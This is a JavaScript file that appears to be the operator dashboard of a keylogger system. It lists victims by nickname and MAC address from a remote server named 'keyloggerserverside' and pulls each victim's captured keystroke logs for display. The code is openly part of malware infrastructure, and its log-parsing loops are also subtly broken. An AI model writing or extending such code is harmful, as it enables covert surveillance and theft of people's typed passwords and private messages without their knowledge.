function loadButtons() {
    fetch('https://keyloggerserverside.onrender.com/users/list_of_users', {method: 'GET',headers:{
        'ngrok-skip-browser-warning': 'true',  // Add the header here
      }})
        .then(response => response.json())
        .then(jsons => jsons.users)
        .then(data => {
            console.log(data)
                const container = document.getElementById('buttons_container')
                data.forEach(file => {
                    const button = document.createElement('button');
                    const p1 = document.createElement('p')
                    p1.classList.add('p_button')
                    const p2 = document.createElement('p')
                    p2.classList.add('p_button')
                    const br = document.createElement('br')
                    p1.textContent = `name: ${file.nickname}`
                    p2.textContent = `mac adress: ${file.mac_address}`
                    button.classList.add('button', 'button_hover', 'a_buttons')
                    button.id = file._id
                    button.appendChild(p1)
                    button.appendChild(br)
                    button.appendChild(p2)
                    button.onclick = function() {
                        clicking(button.id)
                    }
                    container.appendChild(button)
                    

                })

            }
        )
}

function clicking(user_id) {
    const id = user_id
    window.location.href = `Dashboard.HTML?id=${user_id}`
}

function receiveUserData() {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');
    const lst = []
    fetch(`https://keyloggerserverside.onrender.com/data/get_logs_for_user?id=${id}`, {method: 'GET'})
        .then(response => response.json())
        .then(data => data.logs)
        .then(data => {
            console.log(data)
            for(win in data) {
                for(time in win) {
                    for(letter in time) {
                        lst.push(letter)
                    }
                }
            }
        })
    console.log(lst)
        
}